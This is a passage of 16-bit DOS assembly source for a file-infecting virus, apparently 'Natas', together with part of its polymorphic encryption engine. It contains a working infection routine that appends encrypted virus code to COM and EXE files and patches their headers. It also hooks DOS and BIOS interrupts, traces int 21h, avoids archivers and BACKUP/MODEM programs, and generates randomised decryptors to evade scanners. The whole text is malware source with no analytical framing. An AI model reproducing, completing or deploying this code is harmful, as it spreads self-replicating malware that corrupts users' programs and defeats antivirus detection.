jump_21:        call    undo_24                 ; unhook int 24h
                push    cs
                pop     ds
                mov     al,1h
                mov     di,offset int_1
                cmp     byte ptr ds:[di+origin-int_1],al ; file origin?
                jne     jump_21_1
                call    get_int                 ; get int 1h address
                mov     ds:[di],bx
                mov     ds:[di + 2],es
                mov     byte ptr ds:[di+inst_count-int_1],5
                mov     ds:trace_mode,step_21
                mov     dx,offset tracer
                call    set_int                 ; hook int 1h
                call    pop_all
                push    si
                pushf
                pop     si
                call    si_tf                   ; set TF
                pop     si
go_21:          cli
                mov     ss,cs:int_21_ss
                mov     sp,cs:int_21_sp         ; restore stack
                sti
go_2_21:        jmp     cs:int_21
                
jump_21_1:      call    pop_all
                jmp     go_21

;=====( actual infection routine )===========================================;

infect:         push    cs
                pop     ds
                call    read_header             ; read first 18h bytes
                jc      inf_bad_file
                mov     si,dx
                mov     di,offset work_header
                cld
                rep     movsb                   ; copy header to work_header
                call    get_dcb
                les     ax,ds:[di.dcb_size]     ; get file size
                mov     dx,es
                mov     word ptr ds:[di.dcb_pos],ax
                mov     word ptr ds:[di.dcb_pos+2],dx ; lseek to end
                push    cs cs
                pop     es ds
                mov     cx,ds:[si]              ; get first 2 bytes
                cmp     cx,'MZ'                 ; .EXE file?
                je      inf_exe
                cmp     cx,'ZM'                 ; .EXE file?
                je      inf_exe
                or      dx,bp                   ; COM file and < 64k?
                jnz     inf_bad_file
                cmp     ax,0-(file_size+100)
                ja      inf_bad_file
                cmp     ax,1000
                jb      inf_bad_file
                mov     byte ptr ds:[si],0e9h   ; build jump
                inc     ah                      ; Add PSP size (100h)
                push    ax                      ; save IP for engine
                add     ax,offset decrypt-103h  ; get jump disp. (- PSP size)
                mov     ds:[si+1],ax
                jmp     append_vir

inf_bad_file:   stc
                retn

inf_exe:        cmp     word ptr ds:[si.eh_max_mem],-1
                jne     inf_bad_file
                mov     bp,ax
                mov     di,dx                   ; save size in DI:BP
                mov     cx,200h
                div     cx                      ; divide into pages
                or      dx,dx                   ; Any remainder?
                jz      no_round
                inc     ax
no_round:       sub     ax,ds:[si.eh_size]      ; size same as header says?
                jne     inf_bad_file
                sub     dx,ds:[si.eh_modulo]
                jne     inf_bad_file
                mov     ax,file_size            ; virus size
                add     ax,bp
                adc     dx,di                   ; + program size
                div     cx                      ; / 512
                or      dx,dx                   ; round up?
                jz      no_round1
                inc     ax
no_round1:      mov     ds:[si.eh_size],ax
                mov     ds:[si.eh_modulo],dx    ; set new size
                mov     bx,0-(file_size+1000)
                xor     cx,cx
get_exe_ip:     cmp     bp,bx                   ; make sure virus does not
                                                ; cross segments
                jb      got_exe_ip
                sub     bp,10h                  ; down 10h bytes
                loop    get_exe_ip              ; up 1 paragraph
got_exe_ip:     cmp     di,0fh
                ja      inf_bad_file
                xchg    cx,ax
                mov     cl,4
                ror     di,cl                   ; get segment displacement
                or      ax,ax
                jz      no_para_add
                sub     di,ax                   ; Add segments from LOOP
                jnc     inf_bad_file
no_para_add:    sub     di,ds:[si.eh_size_header] ; CS-header size in 
                                                ; paragraphs
                push    bp                      ; save offset of v_start
                add     bp,decrypt-v_start
                mov     ds:[si.eh_ip],bp        ; set IP
                mov     ds:[si.eh_cs],di        ; set CS
                add     bp,512                  ; 512 bytes of stack
                mov     ds:[si.eh_sp],bp        ; set SP
                mov     ds:[si.eh_ss],di        ; set SS
                mov     bp,8000h                ; Tell engine "Exe file"
                sar     bx,cl                   ; 0 - ((file_size+1000h)/16)
                mov     ax,ds:[si.eh_min_mem]
                sub     ax,bx                   ; add file_size+1000h/16
                jnb     append_vir
                mov     ds:[si.eh_min_mem],ax

append_vir:     pop     ax
                call    engine                  ; encrypt/write/decrypt
                push    bp             
                popf
                jc      append_vir_err
                call    get_dcb
                mov     word ptr ds:[di.dcb_pos],cx
                mov     word ptr ds:[di.dcb_pos+2],cx ; lseek to start
                mov     ah,40h
                mov     dx,offset work_header
                push    cs
                pop     ds
                call    header_op               ; write new header to file
append_vir_err: retn
                
;=====( Get DCB address for file )===========================================;

get_dcb:        push    ax bx 
                mov     ax,1220h
                mov     bx,cs:handle            ; get file handle
                int     2fh                     ; get DCB number address
                jc      get_dcb_fail
                mov     ax,1216h
                mov     bl,es:[di]              ; get DCB number
                cmp     bl,-1                   ; Handle Openned?
                cmc
                je      get_dcb_fail
                int     2fh                     ; get DCB address
                jc      get_dcb_fail
                push    es
                pop     ds
                test    byte ptr ds:[di.dcb_dev_attr],80h ; device or file?
                cmc
                jne     get_dcb_fail
                test    byte ptr ds:[di.dcb_date+1],80h ; infected?
get_dcb_fail:   pop     bx ax               
                retn

;=====( Swap original 13h/15h/40h addresses with IVT addresses )=============;

int_2_bios:     push    ax bx dx ds
                mov     al,13h                  ; int 13h
                mov     di,offset int_13
int_2_bios_lp:  push    cs
                pop     ds
                call    get_int                 ; get int address               
                mov     dx,es
                xchg    bx,ds:[di]              ; swap offsets
                cld
                scasw
                xchg    dx,bx
                xchg    bx,ds:[di]              ; swap segments
                scasw
                mov     ds,bx                   ; DS:DX=new address
                call    set_int                 ; set int to DS:DX
                cmp     al,15h                  
                mov     al,15h
                jnb     int_2_bios_40           ; CY AL=13h
                add     di,4
                jmp     int_2_bios_lp

int_2_bios_40:  mov     al,40h
                je      int_2_bios_lp           ; ZR AL=15h else AL=40h, exit
                pop     ds dx bx ax
                retn

;=====( Read/write header to file )==========================================;

read_header:    mov     ah,3fh
                cmp     ax,0
                org     $ - 2
write_header:   mov     ah,40h
                mov     dx,offset header
header_op:      mov     cx,18h
                call    call_21_file             ; read/write header
                jc      read_write_err
                sub     ax,cx
read_write_err: retn

;=====( Unhook int 24h )=====================================================;

undo_24:        mov     al,24h
                lds     dx,cs:int_24
                call    set_int                 ; unhook int 24h
                in      al,21h
                and     al,not 2                ; enable keyboard
                out     21h,al
                retn

;=====( Save returns after int 21h call )====================================;

save_returns:   mov     ss:[bp.reg_ax],ax
                pushf
                pop     ss:[bp.reg_f]
                retn

;=====( Return ZF set if ARJ, PKZIP, LHA or MODEM )==========================;

is_specialfile: push    ax cx si di es
                mov     al,0
check_special   =       byte ptr $ - 1
                or      al,al                   ; Check for special?
                jnz     it_is_special
                call    get_psp                 ; get MCB of current PSP
                mov     ax,es:[di]              ; get 1st 2 letters of name
                cmp     ax,'RA'                 ; ARj?
                je      it_is_special
                cmp     ax,'HL'                 ; LHa?
                je      it_is_special
                cmp     ax,'KP'                 ; PKzip?
                je      it_is_special
                mov     cx,2
                mov     si,offset backup
is_it_mod_bak:  push    cx di
                mov     cl,8
                lods    byte ptr cs:[si]        ; get 'B' or 'M'
                xor     al,66h + 6h             ; decrypt
                repne   scasb
                jne     is_it_mod
                cmp     cl,3
                jb      is_it_mod
                mov     cl,4
is_ode_ack:     lods    byte ptr cs:[si]
                xor     al,66h + 6h
                jz      is_it_mod               ; 0 (done)?
                scasb
                loope   is_ode_ack
is_it_mod:      mov     si,offset modem
                pop     di cx
                loopne  is_it_mod_bak
it_is_special:  pop     es di si cx ax
                retn

backup:         db      'B' xor (66h + 6h) 
                db      'A' xor (66h + 6h)
                db      'C' xor (66h + 6h)
                db      'K' xor (66h + 6h)
                db      0   xor (66h + 6h)

modem:          db      'M' xor (66h + 6h)
                db      'O' xor (66h + 6h)
                db      'D' xor (66h + 6h)
                db      'E' xor (66h + 6h)
                db      'M' xor (66h + 6h)


;=====( get current PSP segment )============================================;

get_psp:        push    ax bx
                mov     ah,62h
                call    call_21                 ; get PSP segment
                dec     bx
                mov     es,bx                   ; MCB of current program
                mov     di,8h                   ; offset of file name
                cld
                pop     bx ax
                retn
                
;=====( Get DTA address )====================================================;

get_dta:        mov     ah,2fh
                call    call_21                 ; DTA address into ES:BX
                push    es
                pop     ds
                retn

call_dos_13:    call    swap_13
                pushf
                call    cs:dos_13
                call    swap_13
                retn

call_disk:      test    dl,80h                  ; ZF -> Floppy disk (int 40h)
                je      call_40

call_13:        pushf
                call    cs:int_13
                retn

call_21_file:   mov     bx,0
handle          =       word ptr $ - 2

call_21:        pushf
                push    cs
                call    go_2_21
                retn

call_40:        pushf
                call    cs:int_40
                retn

include eng.asm

                db      "Natas",0

even

decrypt:        mov     word ptr ds:[100h],1f0eh        ; PUSH CS/POP DS
                mov     byte ptr ds:[102h],0e8h         ; CALL
                jmp     file_start
                
                org     decrypt + 150

header          dw      18h / 2 dup(20cdh)

file_end:

work_header     dw      18h / 2 dup(?)
                
write_buff:     db      encode_end-encode dup(?)

int_21_ss       dw      ?
int_21_sp       dw      ?

                dw      256 / 2 dup(?)
temp_stack:            

jump_code_13    db      5 dup(?)
jump_code_21    db      5 dup(?)

int_1           dd      ?
int_24          dd      ?

int_13          dd      ?
dos_13          dd      ?
int_15          dd      ?
int_40          dd      ?
int_21          dd      ?

new_24:         db      3 dup(?)

push_pop_ret    dw      ?

pointer         dw      ?
disp            dw      ?
encode_ptr      dw      ?
encode_enc_ptr  dw      ?

key_reg         db      ?
count_reg       db      ?
ptr_reg         db      ?
ptr_reg1        db      ?
modify_op       db      ?


origin          db      ?
inst_count      db      ?

disk_buff       db      512 dup(?)

v_end:


;=====( Very useful structures )=============================================;



;=====( Memory Control Block structure )=====================================;

mcb             struc
mcb_sig         db      ?               ; 'Z' or 'M'
mcb_owner       dw      ?               ; attribute of owner
mcb_size        dw      ?               ; size of mcb block
mcb_name        db      8 dup(?)        ; file name of owner
mcb             ends


;=====( For functions 11h and 12h )==========================================;


Directory       STRUC
DS_Drive        db ?
DS_Name         db 8 dup(0)
DS_Ext          db 3 dup(0)
DS_Attr         db ?
DS_Reserved     db 10 dup(0)
DS_Time         dw ?
DS_Date         dw ?
DS_Start_Clust  dw ?
DS_Size         dd ?
Directory       ENDS


;=====( for functions 4eh and 4fh )==========================================;


DTA             STRUC
DTA_Reserved    db 21 dup(0)
DTA_Attr        db ?
DTA_Time        dw ?
DTA_Date        dw ?
DTA_Size        dd ?
DTA_Name        db 13 dup(0)
DTA             ENDS


Exe_Header      STRUC
EH_Signature    dw ?                    ; Set to 'MZ' or 'ZM' for .exe files
EH_Modulo       dw ?                    ; remainder of file size/512
EH_Size         dw ?                    ; file size/512
EH_Reloc        dw ?                    ; Number of relocation items
EH_Size_Header  dw ?                    ; Size of header in paragraphs
EH_Min_Mem      dw ?                    ; Minimum paragraphs needed by file
EH_Max_Mem      dw ?                    ; Maximum paragraphs needed by file
EH_SS           dw ?                    ; Stack segment displacement
EH_SP           dw ?                    ; Stack Pointer
EH_Checksum     dw ?                    ; Checksum, not used
EH_IP           dw ?                    ; Instruction Pointer of Exe file
EH_CS           dw ?                    ; Code segment displacement of .exe
eh_1st_reloc    dw      ?               ; first relocation item
eh_ovl          dw      ?               ; overlay number
Exe_Header      ENDS                      

Boot_Sector             STRUC
bs_Jump                 db 3 dup(?)
bs_Oem_Name             db 8 dup(?)
bs_Bytes_Per_Sector     dw ?
bs_Sectors_Per_Cluster  db ?
bs_Reserved_Sectors     dw ?               
bs_FATs                 db ?             ; Number of FATs
bs_Root_Dir_Entries     dw ?             ; Max number of root dir entries
bs_Sectors              dw ?             ; number of sectors; small
bs_Media                db ?             ; Media descriptor byte
bs_Sectors_Per_FAT      dw ?
bs_Sectors_Per_Track    dw ?               
bs_Heads                dw ?             ; number of heads
bs_Hidden_Sectors       dd ?
bs_Huge_Sectors         dd ?             ; number of sectors; large
bs_Drive_Number         db ?
bs_Reserved             db ?
bs_Boot_Signature       db ?
bs_Volume_ID            dd ?
bs_Volume_Label         db 11 dup(?)
bs_File_System_Type     db 8 dup(?)
Boot_Sector             ENDS
                
                
Partition_Table         STRUC
pt_Code                 db 1beh dup(?)  ; partition table code
pt_Status               db ?            ; 0=non-bootable 80h=bootable
pt_Start_Head           db ?            
pt_Start_Sector_Track   dw ?
pt_Type                 db ?            ; 1 = DOS 12bit FAT 4 = DOS 16bit FAT
pt_End_Head             db ?
pt_End_Sector_Track     dw ?
pt_Starting_Abs_Sector  dd ?
pt_Number_Sectors       dd ?
Partition_Table         ENDS


int_1_stack     STRUC
st_ip           dw ?                    ; offset of next instruction after
                                        ; interrupt
st_cs           dw ?                    ; segment of next instruction
st_flags        dw ?                    ; flags when interrupt was called
int_1_stack     ENDS

;----------------------------------------------------------------------------;
;               Dcb description for DOS 3+                                   ;   
;                                                                            ;
;      Offset  Size    Description                                           ;
;       00h    WORD    number of file handles referring to this file         ;
;       02h    WORD    file open mode (see AH=3Dh)                           ;
;              bit 15 set if this file opened via FCB                        ;
;       04h    BYTE    file attribute                                        ;
;       05h    WORD    device info word (see AX=4400h)                       ;
;       07h    DWORD   pointer to device driver header if character device   ;
;              else pointer to DOS Drive Parameter Block (see AH=32h)        ;
;       0Bh    WORD    starting cluster of file                              ;
;       0Dh    WORD    file time in packed format (see AX=5700h)             ;
;       0Fh    WORD    file date in packed format (see AX=5700h)             ;
;       11h    DWORD   file size                                             ;
;       15h    DWORD   current offset in file                                ;
;       19h    WORD    relative cluster within file of last cluster accessed ;
;       1Bh    WORD    absolute cluster number of last cluster accessed      ;
;              0000h if file never read or written???                        ;
;       1Dh    WORD    number of sector containing directory entry           ;
;       1Fh    BYTE    number of dir entry within sector (byte offset/32)    ;
;       20h 11 BYTEs   filename in FCB format (no path/period, blank-padded) ;
;       2Bh    DWORD   (SHARE.EXE) pointer to previous SFT sharing same file ;
;       2Fh    WORD    (SHARE.EXE) network machine number which opened file  ;
;       31h    WORD    PSP segment of file's owner (see AH=26h)              ;
;       33h    WORD    offset within SHARE.EXE code segment of               ;
;              sharing record (see below)  0000h = none                      ;
;----------------------------------------------------------------------------;                                                                            



dcb             struc
dcb_users       dw      ?
dcb_mode        dw      ?
dcb_attr        db      ?
dcb_dev_attr    dw      ?
dcb_drv_addr    dd      ?
dcb_1st_clst    dw      ?
dcb_time        dw      ?
dcb_date        dw      ?
dcb_size        dd      ?
dcb_pos         dd      ?
dcb_last_clst   dw      ?
dcb_current_clst dw     ?
dcb_dir_sec     dw      ?
dcb_dir_entry   db      ?
dcb_name        db      8 dup(?)
dcb_ext         db      3 dup(?)
dcb_useless1    dw      ?
dcb_useless2    dw      ?
dcb_useless3    dw      ?
dcb_psp_seg     dw      ?
dcb_useless4    dw      ?
dcb             ends

bpb                     STRUC
bpb_Bytes_Per_Sec       dw ?
bpb_Sec_Per_Clust       db ?
bpb_Reserved_Sectors    dw ?               
bpb_FATs                db ?             ; Number of FATs
bpb_Root_Dir_Entries    dw ?             ; Max number of root dir entries
bpb_Sectors             dw ?             ; number of sectors; small
bpb_Media               db ?             ; Media descriptor byte
bpb_Sectors_Per_FAT     dw ?
bpb_Sectors_Per_Track   dw ?               
bpb_Heads               dw ?             ; number of heads
bpb_Hidden_Sectors      dd ?
bpb_Huge_Sectors        dd ?             ; number of sectors; large
bpb_Drive_Number        db ?
bpb_Reserved            db ?
bpb_Boot_Signature      db ?
bpb_Volume_ID           dd ?
bpb_Volume_Label        db 11 dup(?)
bpb_File_System_Type    db 8 dup(?)
bpb                     ENDS


register        struc
reg_es          dw      ?
reg_ds          dw      ?
reg_di          dw      ?
reg_si          dw      ?
reg_bp          dw      ?
reg_dx          dw      ?
reg_cx          dw      ?
reg_bx          dw      ?
reg_ax          dw      ?
reg_f           dw      ?
register        ends

sys_file        struc
sys_next        dd      ?
sys_strat       dw      ?
sys_int         dw      ?
sys_file        ends
                
                
                end
-----------------------------<<eng.asm>>---------------------------------------

_ax             equ     0
_cx             equ     1
_dx             equ     2
_bx             equ     3
_sp             equ     4
_bp             equ     5
_si             equ     6
_di             equ     7

                
engine:         mov     ds:pointer,ax           ; save IP
                mov     di,offset decrypt
                mov     bx,offset make_count
                mov     cx,offset make_key
                mov     dx,offset make_ptr
                mov     si,offset order_ret
                or      bp,11101111b            ; SP is used
                call    order                   ; randomize and call registers
                push    di                      ; save start of loop
                push    di
                mov     si,offset encode
                mov     di,offset write_buff
                mov     cx,encode_end-encode
                rep     movsb                   ; copy write code
                mov     ds:encode_ptr,offset (encode_break-encode)+write_buff
                pop     di
                mov     bx,offset make_enc
                mov     cx,offset make_keychange
                mov     dx,offset make_deccount
                mov     si,offset make_incptr
                call    order                   ; call routines

;=====( Preform loop )=======================================================;

                mov     ax,2
                push    ax
                call    random                  ; test BP for 4000?
                pop     ax
                jz      loop_no_test
                test    bp,4000h                ; possible to just "Jcc"?
                jnz     loop_make_jcc
loop_no_test:   call    random
                jz      loop_no_test1
                test    bp,2000h                ; use loop?
                jnz     loop_make_jcc
loop_no_test1:  or      bp,800h                 ; do not change flags
                mov     ax,2
                cwd
                call    random                  ; try OR/AND/TEST reg,reg
                                                ; or XOR/ADD/OR/SUB reg,0?
                mov     al,ds:count_reg         ; get counter
                jnz     loop_orandtest
                call    boolean                 ; do XOR/OR/ADD or ADD/SUB?
                jnz     loop_modify
                call    add_reg                 ; ADD/SUB reg,0
                jmp     loop_make_jcc

loop_modify:    call    modify_reg              ; XOR/OR/ADD reg,0
                jmp     loop_make_jcc

loop_orandtest: mov     cl,3
                mov     ch,al
                shl     ch,cl
                or      al,ch                   ; set reg1 as reg2 also
                mov     bx,2                    ; OR/AND/TEST
                call    random_bx
                jnz     loop_and
                or      ax,9c0h                 ; OR reg1, reg2
loop_reverse:   call    boolean                 ; use 9 or 11?
                jnz     loop_orandteststo
                or      ah,2h                   ; reg2, reg1
                jmp     loop_orandteststo

loop_and:       dec     bx
                jnz     loop_test
                or      ax,21c0h                ; AND reg1, reg2
                jmp     loop_reverse

loop_test:      or      ax,85c0h                ; TEST reg1, reg2
loop_orandteststo:
                xchg    al,ah
                stosw                           ; store TEST/OR/AND
                or      bp,1800h                ; do not change flags/
                                                ; test stored
                call    garble
loop_make_jcc:  and     bp,not 800h
                test    bp,2000h                ; code loop?
                jz      loop_make_jump
                mov     al,0e2h                 ; LOOP
                test    bp,1000h                ; possible to use LOOPNZ/Z?
                jz      loop_code_disp
                call    boolean
                jnz     loop_code_disp
                dec     ax                      ; LOOPZ
                call    boolean
                jnz     loop_iscx
                dec     ax                      ; LOOPNZ
                jmp     loop_code_disp
                
;=====( Now make conditional jump )==========================================;

jcc_tbl:        db      75h,79h,7dh,7fh         ; JNE/JNS/JG/JGE

loop_make_jump: mov     bx,offset jcc_tbl
                mov     ax,3
                call    random
                xlat                            ; get Conditional jump
                mov     bx,2
                call    random_bx               ; use JE/JS/LE/L then JMP?
                jnz     loop_code_disp
                cmp     ds:count_reg,_cx        ; CX is counter?
                jnz     loop_notcx
                mov     bl,4
                call    random_bx
                jnz     loop_notcx
                mov     al,0e3h + 1             ; JCXZ + 1
loop_notcx:     dec     ax
loop_iscx:      stosw
                cmp     al,07fh                 ; Jcxz/loopz?
                ja      loop_code_short
                call    boolean                 ; Use opposite or EB?
                jnz     loop_code_short
                or      bp,800h                 ; dont change flags
loop_code_short:mov     si,di                   ; save offset of displacement
                call    garble
                lea     ax,ds:[si-2]
                sub     ax,di
                neg     al                      ; get jump displacement
                mov     ds:[si-1],al            ; save it
                test    bp,800h                 ; Dont change flags -> "Jcc"
                mov     al,0ebh                 ; Jmp short
                je      loop_code_disp
                mov     ax,3
                call    random
                mov     bx,offset jcc_tbl
                xlat                            ; Get JNE/JNS/JG/JGE
loop_code_disp: stosb                           ; store jump
                pop     ax                      ; start of loop
                dec     ax
                sub     ax,di                   ; get loop displacement
                stosb
                or      bp,11101111b            ; free all registers
                and     bp,not 800h             ; allow flags to change
                call    garble
                mov     ax,19
                call    random                  ; 1 in 20 chance of non-jmp
                jnz     loop_code_jmp
                mov     ax,ds:pointer
                add     ax,offset file_start    ; where to jump
                xchg    dx,ax
                call    get_reg                 ; get a register
                call    mov_reg                 ; Mov value into register
                or      ax,0ffc0h + (4 shl 3)   ; JMP reg16
                call    boolean                 ; PUSH/RET or JMP reg16?
                jnz     loop_code_push
                xchg    al,ah
                jmp     loop_code_stosw

loop_code_push: mov     bx,2
                call    random_bx               ; 1 in 3 chance of FF /6 PUSH
                jnz     loop_code_push1
                xor     al,(6 shl 3) xor (4 shl 3) ; PUSH reg
                xchg    al,ah                
                stosw
                jmp     loop_code_ret

loop_code_push1:xor     al,50h xor (0c0h or (4 shl 3)) ; PUSH reg
                stosb
loop_code_ret:  call    garble
                mov     al,0c3h                 ; RETN
                stosb
                jmp     loop_code_end

loop_code_jmp:  mov     al,0e9h
                stosb                           ; Store Jump
                lea     ax,ds:[di-((file_start-2)-v_start)]
                neg     ax                      ; Jmp file_start
loop_code_stosw:stosw
loop_code_end:  mov     si,ds:encode_enc_ptr    ; get encrypt instruction ptr                                
                cmp     di,offset header        ; Decryptor is too large?
                jb      go_write_buff
                stc                             ; return error
                pushf
                pop     bp
                retn

go_write_buff:  jmp     write_buff              ; encrypt/write/decrypt


;=====( Inc pointer )========================================================;

make_incptr:    mov     ax,word ptr ds:ptr_reg  ; get pointer registers
                mov     dx,2                    ; ADD ptr,2
                cmp     ah,-1                   ; two registers used?
                jz      make_incptr_1
                call    boolean                 ; do one or both?
                jnz     make_incptr_do1
                dec     dx                      ; ADD ptr,1
                call    make_incptr_do1
                jmp     make_incptr_2

make_incptr_do1:call    boolean
                jnz     make_incptr_1
make_incptr_2:  xchg    al,ah
make_incptr_1:  call    add_reg
                sub     ds:disp,dx              ; add to displacement
                retn 

;=====( Dec counter )========================================================;

make_deccount:  cmp     si,offset make_deccount ; last operation?
                jnz     make_deccount_notlast
                call    boolean                 ; do it?
                jnz     make_deccount_notlast
                or      bp,4800h                ; remember we're last
make_deccount_notlast:
                mov     al,ds:count_reg
                cmp     al,_cx                  ; possible to use LOOP/LOOPNZ?
                jnz     make_deccount_notcx
                call    boolean
                jnz     make_deccount_notcx
                or      bp,2000h                ; do LOOP
                jmp     make_deccount_exit

make_deccount_notcx:
                mov     dx,-1                   ; ADD counter,-1
                call    add_reg
make_deccount_exit:
                or      bp,400h                 ; deccount executed
                retn                   

;=====( Make encryption instruction )========================================;

make_enc:       push    bp
                and     bp,not 400h
                mov     al,ds:key_reg
                push    ax                      ; save key register
make_enc_which: mov     ax,4                    ; ADD/SUB/XOR/ROR/ROL
                call    random
                mov     bx,0105h                ; ADD [DI],AX
                mov     cx,1119h                ; ADC/SBB
                mov     dx,2905h                ; SUB [DI],AX
                jz      make_enc_add
                dec     ax
                jz      make_enc_sub
                dec     ax
                jnz     make_enc_ror
                mov     bh,31h                  ; XOR
                mov     dx,3105h                ; XOR [DI],AX
                jmp     make_enc_sto

make_enc_ror:   cmp     ds:key_reg,_cx          ; CX is key?
                jne     make_enc_which
                or      bp,400h                 ; Put XCHG CX,AX
                mov     bh,0d3h
                mov     dx,0d30dh               ; ROL 
                dec     ax
                jz      r_make_enc_sto
                xchg    bx,dx                   ; ROR
r_make_enc_sto: mov     ds:key_reg,al           ; 1 SHL 3 = 08 / D3 08
                                                ; D3 00 = ROL [],CL
                jmp     make_enc_sto

make_enc_sub:   xchg    dh,bh                   ; SUB - ADD [DI],AX
                xchg    cl,ch                   ; SBB/ADC
make_enc_add:   call    boolean                 ; do Carry?
                jnz     make_enc_sto
                push    bx
                mov     bh,ch                   ; Make it ADC/SBB
                call    clear_carry
                cmp     al,0
                org     $ - 1
make_enc_sto:   push    bx
                test    bp,8000h                ; EXE file?
                jz      make_enc_com
                call    is_bp_ptr               ; is BP a pointer?
                je      make_enc_com
                mov     al,2eh                  ; CS:
                call    boolean
                jnz     make_enc_cs
                mov     al,36h                  ; SS:
make_enc_cs:    stosb                           ; store segment override
make_enc_com:   mov     al,bh
                stosb                           ; store instruction
                mov     ax,word ptr ds:ptr_reg  ; get pointer registers
                cmp     ah,-1                   ; second reg?
                je      make_enc_xlat
                add     al,ah
make_enc_xlat:  mov     bx,offset rm_tbl
                xlat                            ; get r/m
                call    is_bp_ptr               ; is BP a pointer?
                jnz     make_enc_nobp
                inc     ah                      ; is there a second reg?
                jne     make_enc_nobp
                or      al,01000000b            ; [BP+xx]
make_enc_nobp:  mov     cx,ds:disp              ; get displacement
                mov     bx,6
                call    random_bx               ; allow no displacement?
                jz      make_enc_get_disp
                jcxz    make_enc_sto_rm
make_enc_get_disp:
                or      al,01000000b            ; 8bit displacement
                call    boolean                 ; allow 8bit displacement?
                jnz     make_enc_16bit
                cmp     cx,7fh                  ; 8bit displacement?
                jbe     make_enc_sto_rm         
                cmp     cx,-80h
                jb      make_enc_16bit
                xor     ch,ch
                cmp     ax,0
                org     $ - 2
make_enc_16bit: xor     al,11000000b            ; 8bit off, 16bit on
make_enc_sto_rm:mov     ah,ds:key_reg
                shl     ah,1
                shl     ah,1
                shl     ah,1                    ; from bits 0-2 of AH
                or      al,ah                   ; to bits 3-5 of AL
                stosb                           ; store r/m byte 
                test    al,11000000b            ; any displacement?
                jz      make_enc_disp
                test    al,10000000b            ; 16bit displacement?
                xchg    cx,ax
                stosw                           ; store displacement
                jnz     make_enc_disp
                dec     di                      ; 8bit only
make_enc_disp:  xchg    di,ds:encode_ptr        ; get encode ptr
                test    bp,400h                 ; store XCHG CX,AX?
                je      make_enc_nor
                mov     al,91h                  ; XCHG CX,AX
                stosb
make_enc_nor:   xchg    dx,ax
                xchg    al,ah
                mov     ds:encode_enc_ptr,di    ; save instruction pointer
                stosw                           ; set encryption instruction
                je      make_enc_nor1
                mov     al,91h                  ; XCHG CX,AX
                stosb
make_enc_nor1:  xchg    di,ds:encode_ptr        ; restore decrypt ptr
                pop     ax
                xchg    al,ah
                mov     word ptr ds:write_buff[encode_flip-encode],ax 
                                                ; save opposite operation
                pop     ax 
                mov     ds:key_reg,al           ; restore key register
                pop     bp
                retn
                
rm_tbl:         db      -1,-1,-1,7,-1,6,4,5,-1,0,1,2,3  ; -1's not used

;=====( Change key )=========================================================;

make_keychange: call    boolean                 ; change key?
                jnz     make_keychange_yes
                retn
                
make_keychange_yes:
                push    bp
                or      bp,200h                 ; let know that keychange
                mov     ax,3
                call    random                  ; 1 in 4 chance of modify_reg
                jnz     keychange_other
                call    random_1
                xchg    dx,ax                   ; Random value to modify key
                                                ; reg by
                mov     al,ds:key_reg
                call    modify_reg              ; XOR/ADD/OR
keychange_stoop:xchg    di,ds:encode_ptr        ; get ptr to encode
                inc     di                      ; CLC
                mov     al,ds:modify_op         ; get operation
                stosb
keychange_stodx:xchg    dx,ax                   ; store value/operation
keychange_sto:  stosw
                xchg    di,ds:encode_ptr        ; get decrypt pointer
                pop     bp
                retn

keychange_other:mov     al,4                    ; ROR/ROL/NOT/NEG/ADD
                call    random 
                jnz     keychange_rol
                mov     ax,0d1c0h               ; ROR AX,1
keychange_cl:   mov     bx,2                    ; 1 in 3 chance of ,CL
                call    random_bx
                jnz     keychange_nocl
                cmp     ds:count_reg,_cx          ; Count is CX?
                jne     keychange_nocl
                test    bp,400h                 ; Count already decremented?
                jnz     keychange_nocl
                or      ah,2                    ; By CL
keychange_nocl: xchg    al,ah
                push    ax
                or      ah,ds:key_reg           ; set key register
                stosw                           ; store instruction
                pop     ax
                xchg    di,ds:encode_ptr        ; get encode ptr
                jmp     keychange_sto

keychange_rol:  dec     ax
                jnz     keychange_not
                mov     ax,0d1c0h or (1 shl 3)  ; ROL AX,1
                jmp     keychange_cl

keychange_not:  dec     ax
                jnz     keychange_neg                
                mov     ax,0f7c0h + (2 shl 3)   ; NOT AX
                jmp     keychange_nocl

keychange_neg:  dec     ax
                jnz     keychange_add
                mov     ax,0f7c0h + (3 shl 3)   ; NEG AX
                jmp     keychange_nocl

keychange_add:  call    random_1
                xchg    dx,ax
                mov     al,ds:key_reg           ; get key register
                call    add_reg                 ; ADD reg(ax), value(dx)
                jmp     keychange_stoop

;=====( Build key )==========================================================;

make_key:       call    get_reg                 ; get register
                xchg    dx,ax
                call    random_1                ; get key
                mov     ds:key,ax               ; save key
                xchg    dx,ax
                mov     ds:key_reg,al           ; save register
                call    mov_reg                 ; MOV reg(ax),value(dx)
                retn

;=====( Build counter )======================================================;

make_count:     call    get_reg                 ; get register
                mov     ds:count_reg,al         ; save register
                mov     dx,(decrypt-v_start)/2  ; # of words to crypt
                call    mov_reg                 ; mov reg(ax),value(dx)
                retn

;=====( Build Pointer )======================================================;

make_ptr:       mov     dx,ds:pointer
                call    get_ptr_reg             ; get DI/SI/BP/BX
                mov     ds:ptr_reg,al
                mov     ds:ptr_reg1,-1          
                mov     bx,3
                call    random_bx               ; 1 in 4 chance of 2 regs
                jnz     make_ptr_2
                cmp     al,_si
                mov     bx,11000000b            ; DI/SI
                jb      make_ptr_test
                mov     bl,00101000b            ; BP/BX
make_ptr_test:  test    bp,bx                   ; 'other' availible?
                jz      make_ptr_2
make_ptr_again: call    get_ptr_reg             ; get DI/SI/BP/BX
                push    ax
                call    conv_num                ; convert to bit-map number
                test    al,bl                   ; is it other type?
                pop     ax
                jnz     make_ptr_ok
                call    del_reg                 ; delete register
                jmp     make_ptr_again

make_ptr_ok:    mov     ds:ptr_reg1,al          ; save second register
                mov     bx,-1
                call    random_bx
                sub     dx,bx                   ; randomize values
                xchg    bx,dx
                call    mov_reg                 ; mov reg(ax), value(dx)
                xchg    bx,dx
                mov     al,ds:ptr_reg           ; get first reg
make_ptr_2:     xor     bx,bx                   ; zero displacement
                call    boolean                 ; use one?
                jnz     make_ptr_nodisp
                mov     bx,-1
                call    random_bx
                sub     dx,bx                   ; subtract displacement
make_ptr_nodisp:mov     ds:disp,bx              ; save displacement
                call    mov_reg                 ; mov reg(ax), value(dx)
                retn
                
;=====( Shell for mov_reg1 )=================================================;

mov_reg:        push    bx dx
                mov     bx,4
                call    random_bx               ; 1 in 5 chance of MOV/ADD/SUB
                jnz     mov_reg_call
                mov     bx,-1
                call    random_bx               ; get random #
                sub     dx,bx                   ; MOV reg, value-random #
                call    mov_reg1                ; do MOV reg,
                mov     dx,bx
                call    add_reg                 ; Now add difference
                pop     dx bx
                retn

